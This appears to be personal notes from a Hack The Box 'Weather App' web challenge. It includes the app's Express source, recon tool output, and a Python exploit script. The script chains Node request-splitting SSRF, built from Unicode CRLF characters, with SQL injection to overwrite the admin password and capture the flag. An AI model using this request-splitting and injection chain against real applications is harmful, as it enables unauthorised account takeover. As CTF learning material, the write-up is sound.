```
const weather = document.getElementById('weather');

const getWeather = async () => {

    let endpoint = 'api.openweathermap.org';

    let res  = await fetch('//ip-api.com/json/')
        .catch(() => {
            weather.innerHTML = `
                <img src='/static/host-unreachable.jpg'>
                <br><br>
                <h4>👨‍🔧 Disable blocker addons</h2>
            `;
        });

    let data = await res.json();

    let { countryCode, city } = data;

    res = await fetch('/api/weather', {
        method: 'POST',
        body: JSON.stringify({
            endpoint: endpoint,
            city: city,
            country: countryCode,
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    
    data = await res.json();

    if (data.temp) {
        weather.innerHTML = `
            <div class='${data.icon}'></div>
            <h1>City: ${city}</h1>
            <h1>Temp: ${data.temp} C</h1>
            <h3>Status: ${data.desc}</h3>
        `;
    } else {
        weather.innerHTML = `
            <h3>${data.message}</h3>
        `;
    }
};

getWeather();
setInterval(getWeather, 60 * 60 * 1000);

POST /api/weather HTTP/1.1

Host: 143.110.169.131:32396

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: mysession=MTY4OTczNjQyNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fF9MoHFAB3xBvl9oZT30jA6IUT7HVQ9iMNT6RZ0KIh9m

Upgrade-Insecure-Requests: 1

Content-Type: application/json

Content-Length: 66



{"endpoint":"api.openweathermap.org","city":"Puno","country":"PE"}

HTTP/1.1 200 OK

X-Powered-By: Express

Content-Type: application/json; charset=utf-8

Content-Length: 50

ETag: W/"32-COnwtmszc9eeTUjhTwTiY51GRIo"

Date: Thu, 20 Jul 2023 00:33:53 GMT

Connection: close



{"desc":"clear sky","icon":"icon-sun","temp":6.54}

┌──(witty㉿kali)-[~]
└─$ dirsearch -u http://143.110.169.131:32396/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/143.110.169.131-32396/-_23-07-19_20-35-48.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-19_20-35-48.log

Target: http://143.110.169.131:32396/

[20:35:49] Starting: 
[20:36:11] 200 -    2KB - /Login
[20:36:11] 200 -    2KB - /login
[20:36:21] 200 -    2KB - /register
[20:36:30] 301 -  179B  - /static  ->  /static/

message	"You are not admin"

I see need to download

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip Weather\ App.zip
Archive:  Weather App.zip
[Weather App.zip] web_weather_app/config/supervisord.conf password: 
  inflating: web_weather_app/config/supervisord.conf  
  inflating: web_weather_app/Dockerfile  
  inflating: web_weather_app/build-docker.sh  
  inflating: web_weather_app/challenge/database.js  
 extracting: web_weather_app/challenge/flag  
 extracting: web_weather_app/challenge/weather-app.db  
  inflating: web_weather_app/challenge/index.js  
  inflating: web_weather_app/challenge/package-lock.json  
  inflating: web_weather_app/challenge/package.json  
  inflating: web_weather_app/challenge/static/favicon.gif  
  inflating: web_weather_app/challenge/static/koulis.gif  
  inflating: web_weather_app/challenge/static/css/main.css  
  inflating: web_weather_app/challenge/static/js/main.js  
  inflating: web_weather_app/challenge/static/js/koulis.js  
  inflating: web_weather_app/challenge/static/host-unreachable.jpg  
  inflating: web_weather_app/challenge/static/weather.gif  
  inflating: web_weather_app/challenge/views/index.html  
  inflating: web_weather_app/challenge/views/register.html  
  inflating: web_weather_app/challenge/views/login.html  
  inflating: web_weather_app/challenge/routes/index.js  
  inflating: web_weather_app/challenge/helpers/HttpHelper.js  
  inflating: web_weather_app/challenge/helpers/WeatherHelper.js 

┌──(witty㉿kali)-[~/Downloads]
└─$ cd web_weather_app 
                                                                                         
┌──(witty㉿kali)-[~/Downloads/web_weather_app]
└─$ ls            
build-docker.sh  challenge  config  Dockerfile
                                                                                         
┌──(witty㉿kali)-[~/Downloads/web_weather_app]
└─$ cd challenge      
                                                                                         
┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ ls
database.js  helpers   package.json       routes  views
flag         index.js  package-lock.json  static  weather-app.db
                                                                                         
┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ cat flag                           
HTB{f4k3_fl4g_f0r_t3st1ng}
                                                                                         
┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ cat index.js       
const express       = require('express');
const app           = express();
const bodyParser    = require('body-parser');
const routes        = require('./routes');
const path          = require('path');
const Database      = require('./database');

const db = new Database('weather-app.db');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));
app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

(async () => {
    await db.connect();
    await db.migrate();

    app.listen(80, () => console.log('Listening on port 80'));
})(); 

┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge/routes]
└─$ cat index.js 
const path              = require('path');
const fs                = require('fs');
const express           = require('express');
const router            = express.Router();
const WeatherHelper     = require('../helpers/WeatherHelper');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.get('/register', (req, res) => {
	return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});

router.get('/login', (req, res) => {
	return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});

router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
});	

module.exports = database => { 
	db = database;
	return router;
};                         

when you login as admin it gives you a flag otherwise it sends you a message ‘you are not admin’

┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ cat package.json 
{
	"name": "weather-app",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"nodeVersion": "v8.12.0",
	"scripts": {
		"start": "node index.js"
	},
	"keywords": [],
	"authors": [
		"makelaris",
		"makelarisjr"
	],
	"dependencies": {
		"body-parser": "^1.19.0",
		"express": "^4.17.1",
		"sqlite-async": "^1.1.1"
	}
}

%27 — '
%22 — "
\u0120 — (space)
\u010D — \r
\u010A — \n

https://twitter.com/YShahinzadeh/status/1039396394195451904/photo/1

https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501

http://143.110.169.131:32396?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/app/flag

┌──(witty㉿kali)-[~]
└─$ arjun -u http://143.110.169.131:32396 
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[!] No parameters were discovered.

uhmm

https://github.com/natachikhinashvili/python_exploits

┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ python3 request_splitting.py                                      
                                                                                                                           
┌──(witty㉿kali)-[~/Downloads/web_weather_app/challenge]
└─$ cat request_splitting.py 
import requests

username = 'admin'
password = "') ON CONFLICT (username) DO UPDATE SET password = 'witty123';--"

username = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")

endpoint = "127.0.0.1/" + "\u0120" + "HTTP/1.1" + "\u010D\u010A"  +  "Host:" + "\u0120"\
    + "127.0.0.1" + "\u010D\u010A" + "\u010D\u010A" + "POST" + "\u0120" + "/register" +\
    "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120" + "127.0.0.1" + "\u010D\u010A"\
    + "Content-Type:" + "\u0120" + "application/x-www-form-urlencoded" + "\u010D\u010A" + \
    "Content-Length:" + "\u0120" + str(len(username) + len(password) + 19) + \
    "\u010D\u010A" + "\u010D\u010A" + "username=" + username + "&password=" + password\
    + "\u010D\u010A" + "\u010D\u010A" + "GET" + "\u0120"

requests.post('http://143.110.169.131:32396/api/weather', json={'endpoint': endpoint, 'city': 'Lima', 'country': 'PE'},  headers={'Connection':'close'})


http://143.110.169.131:32396/login

HTB{w3lc0m3_t0_th3_p1p3_dr34m} 

```


[[Phonebook]]